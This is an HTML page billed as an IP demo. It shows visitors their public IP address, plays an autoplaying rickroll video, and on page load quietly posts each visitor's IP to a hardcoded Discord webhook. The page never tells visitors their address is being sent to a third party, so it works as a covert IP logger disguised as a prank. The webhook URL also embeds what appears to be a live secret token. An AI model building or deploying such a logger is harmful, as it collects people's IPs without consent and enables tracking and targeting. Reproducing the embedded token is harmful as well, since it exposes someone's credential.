<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>IP Demo with Discord Webhook</title>
</head>
<body style="text-align: center; font-family: Arial, sans-serif; padding: 20px;">

  <h2>Your Public IP Address is:</h2>
  <p id="ip">Loading...</p>

  <h3>Enjoy this meme while you're here 😎</h3>
  <video width="480" controls autoplay muted loop>
    <source src="https://media.githubusercontent.com/media/AnIdiotsGuide/website-assets/master/videos/rickroll.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <script>
    // Replace this with your actual Discord webhook URL
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1390268292500820030/bF7_FAN1_YyvGPeLZuhE3TIDSVFIxg0ky0OxRveEVP_8ERIefeUtWRa_GZfj8m7XqhXC';

    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        document.getElementById('ip').textContent = ip;
        console.log("IP Address:", ip);

        // Send to Discord webhook
        fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            content: `🌐 New IP visitor: ${ip}`
          })
        });
      })
      .catch(error => {
        document.getElementById('ip').textContent = "Could not get IP.";
        console.error("Error fetching IP:", error);
      });
  </script>

</body>
</html>
